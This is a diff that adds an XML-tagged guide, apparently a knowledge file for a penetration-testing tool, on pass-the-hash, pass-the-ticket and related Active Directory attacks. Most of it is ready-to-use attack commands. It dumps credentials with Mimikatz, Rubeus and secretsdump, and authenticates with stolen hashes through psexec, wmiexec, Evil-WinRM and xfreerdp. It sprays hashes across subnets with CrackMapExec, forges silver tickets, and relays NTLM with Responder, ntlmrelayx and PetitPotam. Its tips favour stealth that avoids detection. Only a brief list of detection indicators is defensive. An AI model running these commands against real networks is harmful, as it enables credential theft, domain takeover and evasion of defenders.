@@ -1,0 +1,202 @@
+<vulnerability_guide>
+  <title>PASS-THE-HASH AND PASS-THE-TICKET ATTACKS</title>
+
+  <critical>Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) attacks allow authentication using captured credential material without knowing the plaintext password. NTLM hashes and Kerberos tickets can be reused directly for authentication, enabling lateral movement across Windows networks. These techniques are fundamental to Active Directory compromise.</critical>
+
+  <scope>
+    - NTLM authentication to Windows services (SMB, WinRM, RDP NLA, LDAP)
+    - Kerberos ticket reuse across services (TGT and TGS)
+    - Local administrator hash reuse across systems
+    - Domain admin credential harvesting and reuse
+    - Service account authentication via cached credentials
+  </scope>
+
+  <methodology>
+    1. **Credential extraction**: Dump NTLM hashes or Kerberos tickets from memory/files
+    2. **Target identification**: Find systems where credentials are valid
+    3. **Hash/ticket injection**: Inject credentials into authentication context
+    4. **Authenticate**: Use injected credentials to access target resources
+    5. **Lateral movement**: Pivot to additional systems using harvested credentials
+  </methodology>
+
+  <advanced_techniques>
+    <credential_extraction>
+      Extract hashes and tickets from memory:
+      {% raw %}
+      # Mimikatz - dump all credentials
+      mimikatz # sekurlsa::logonpasswords
+
+      # Mimikatz - dump NTLM hashes
+      mimikatz # lsadump::sam
+      mimikatz # lsadump::dcsync /user:Administrator
+
+      # Mimikatz - export Kerberos tickets
+      mimikatz # sekurlsa::tickets /export
+
+      # Rubeus - dump all tickets
+      Rubeus.exe dump
+      Rubeus.exe triage
+
+      # Impacket - secretsdump
+      secretsdump.py domain/user:password@target
+      secretsdump.py -hashes :NTLM_HASH domain/user@target
+
+      # From SAM database (offline)
+      secretsdump.py -sam SAM -system SYSTEM LOCAL
+      {% endraw %}
+    </credential_extraction>
+
+    <pass_the_hash>
+      Use NTLM hash for authentication:
+      {% raw %}
+      # Mimikatz - overpass-the-hash (convert NTLM to Kerberos)
+      mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:cmd.exe
+
+      # Impacket - psexec with hash
+      psexec.py -hashes :NTLM_HASH domain/administrator@target
+
+      # Impacket - wmiexec with hash
+      wmiexec.py -hashes :NTLM_HASH domain/administrator@target
+
+      # Impacket - smbexec with hash
+      smbexec.py -hashes :NTLM_HASH domain/administrator@target
+
+      # CrackMapExec - mass PtH
+      crackmapexec smb targets.txt -u administrator -H NTLM_HASH
+
+      # Evil-WinRM with hash
+      evil-winrm -i target -u administrator -H NTLM_HASH
+
+      # xfreerdp with hash (RDP NLA)
+      xfreerdp /v:target /u:administrator /pth:NTLM_HASH
+      {% endraw %}
+    </pass_the_hash>
+
+    <pass_the_ticket>
+      Use Kerberos ticket for authentication:
+      {% raw %}
+      # Mimikatz - inject TGT
+      mimikatz # kerberos::ptt ticket.kirbi
+
+      # Rubeus - pass the ticket
+      Rubeus.exe ptt /ticket:base64_ticket
+      Rubeus.exe ptt /ticket:ticket.kirbi
+
+      # Export and use TGT
+      Rubeus.exe dump /service:krbtgt /nowrap
+      Rubeus.exe ptt /ticket:TGT_BASE64
+
+      # Impacket - export ccache format
+      export KRB5CCNAME=/path/to/ticket.ccache
+      psexec.py -k -no-pass domain/user@target
+
+      # Convert between formats
+      ticketConverter.py ticket.kirbi ticket.ccache
+      {% endraw %}
+    </pass_the_ticket>
+
+    <overpass_the_hash>
+      Convert NTLM hash to Kerberos ticket:
+      {% raw %}
+      # Rubeus - request TGT using hash
+      Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
+      Rubeus.exe asktgt /user:administrator /aes256:AES_KEY /ptt
+
+      # Mimikatz - sekurlsa::pth with Kerberos
+      sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:powershell.exe
+
+      # Impacket - getTGT with hash
+      getTGT.py -hashes :NTLM_HASH domain/administrator
+      export KRB5CCNAME=administrator.ccache
+      {% endraw %}
+    </overpass_the_hash>
+
+    <silver_ticket>
+      Forge service tickets using service account hash:
+      {% raw %}
+      # Mimikatz - silver ticket for CIFS
+      kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_NTLM /ptt
+
+      # Rubeus - silver ticket
+      Rubeus.exe silver /service:cifs/target.domain.local /rc4:NTLM_HASH /user:administrator /domain:domain.local /ptt
+
+      # Impacket - ticketer for silver ticket
+      ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
+      {% endraw %}
+    </silver_ticket>
+
+    <credential_relay>
+      Relay captured authentication:
+      {% raw %}
+      # Responder - capture NTLM hashes
+      responder -I eth0 -wrf
+
+      # ntlmrelayx - relay to SMB
+      ntlmrelayx.py -t smb://target -smb2support
+
+      # ntlmrelayx - relay to LDAP (for ACL abuse)
+      ntlmrelayx.py -t ldaps://dc.domain.local --escalate-user attacker
+
+      # ntlmrelayx - relay to AD CS (ESC8)
+      ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template User
+
+      # PetitPotam - coerce authentication
+      PetitPotam.py attacker_ip target_ip
+      {% endraw %}
+    </credential_relay>
+
+    <lateral_movement>
+      Move across the network:
+      {% raw %}
+      # CrackMapExec - enumerate admin access
+      crackmapexec smb targets.txt -u administrator -H HASH --local-auth
+
+      # Find systems where hash is valid
+      crackmapexec smb 192.168.1.0/24 -u administrator -H HASH
+
+      # WMI execution with hash
+      wmiexec.py -hashes :HASH domain/admin@target "whoami"
+
+      # Remote PowerShell
+      Enter-PSSession -ComputerName target -Credential $cred
+      {% endraw %}
+    </lateral_movement>
+  </advanced_techniques>
+
+  <validation>
+    - Successfully extract NTLM hash or Kerberos ticket
+    - Authenticate to remote system using hash/ticket (no password)
+    - Execute commands on target system
+    - Demonstrate lateral movement capability
+    - Document scope of access with compromised credentials
+  </validation>
+
+  <false_positives>
+    - Expired Kerberos tickets - check ticket lifetime
+    - Hash for disabled account
+    - Local admin hash on non-domain systems
+    - Restricted admin mode blocking PtH
+    - Credential Guard protected credentials
+  </false_positives>
+
+  <detection_indicators>
+    - Event ID 4624 Type 3 (Network) from unexpected sources
+    - Event ID 4648 - Explicit credential use
+    - Event ID 4768/4769 with RC4 encryption anomalies
+    - NTLM authentication from Kerberos-capable systems
+    - Unusual admin account lateral movement patterns
+  </detection_indicators>
+
+  <pro_tips>
+    - Local Administrator hash often works across multiple systems (same image)
+    - AES keys are preferred over RC4 hashes for Kerberos (less detection)
+    - Overpass-the-hash generates valid Kerberos ticket from NTLM hash
+    - Silver tickets work even if user password changes (until service account rotates)
+    - Credential Guard on Windows 10+ protects credentials in memory
+    - Use WMI/WinRM over SMB for less noisy lateral movement
+    - Check for systems with SMB signing disabled for relay attacks
+    - Domain controller machine accounts have replication privileges
+  </pro_tips>
+
+  <remember>Pass-the-Hash works because Windows stores and accepts NTLM hashes directly - the plaintext password is never needed for network authentication.</remember>
+</vulnerability_guide>
